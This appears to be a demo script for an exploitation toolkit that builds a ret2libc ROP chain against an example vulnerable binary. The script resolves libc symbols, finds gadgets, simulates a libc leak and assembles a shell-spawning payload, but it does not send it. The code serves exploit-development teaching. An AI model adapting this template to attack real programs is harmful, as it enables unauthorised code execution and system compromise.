print("[*] ROP Chain with Libc Attack")
print("=" * 50)

let binary_path = "examples/vuln_binary"

print("\n[*] Step 1: Loading binary and libc database...")
let elf = Elf(binary_path)
let libc = Libc("ubuntu20.04")

print("Binary:", elf.path)
print("Libc version:", libc.name)
print("Build ID:", libc.build_id)

print("\n[*] Step 2: Extracting libc offsets...")
print("system offset:", hex(libc.symbols.system))
print("bin_sh offset:", hex(libc.symbols.bin_sh))
print("execve offset:", hex(libc.symbols.execve))

print("\n[*] Step 3: Finding ROP gadgets...")
let rop = ROP(elf)
print("Total gadgets found:", rop.gadget_count)

print("\nSearching for useful gadgets...")
let pop_rdi = find(rop, "pop rdi")
let ret = find(rop, "ret")

print("pop rdi; ret at:", hex(pop_rdi))
print("ret at:", hex(ret))

print("\n[*] Step 4: Simulating libc base calculation...")
let libc_leak = 0x7ffff7a00000
print("Leaked libc address:", hex(libc_leak))

let libc_based = Libc({version: "ubuntu20.04", base: libc_leak})
let system_addr = libc_based.symbols.system
let binsh_addr = libc_based.symbols.bin_sh

print("system() at:", hex(system_addr))
print("/bin/sh at:", hex(binsh_addr))

print("\n[*] Step 5: Building ROP chain...")
let offset = 264
let payload = cyclic(offset)
payload = payload + p64(ret)
payload = payload + p64(pop_rdi)
payload = payload + p64(binsh_addr)
payload = payload + p64(system_addr)

print("Final payload size:", len(payload), "bytes")

print("\n[*] Step 6: Displaying one-gadgets...")
let one_gadgets = libc_based.one_gadgets
print("One-gadget count:", len(one_gadgets))

print("\n[+] ROP chain construction complete!")
print("\n[*] Attack strategy:")
print("    1. Leak libc address (puts/printf/etc)")
print("    2. Calculate libc base")
print("    3. Resolve system() and /bin/sh")
print("    4. Build ROP chain: ret -> pop rdi -> /bin/sh -> system()")
print("    5. Send payload and get shell")
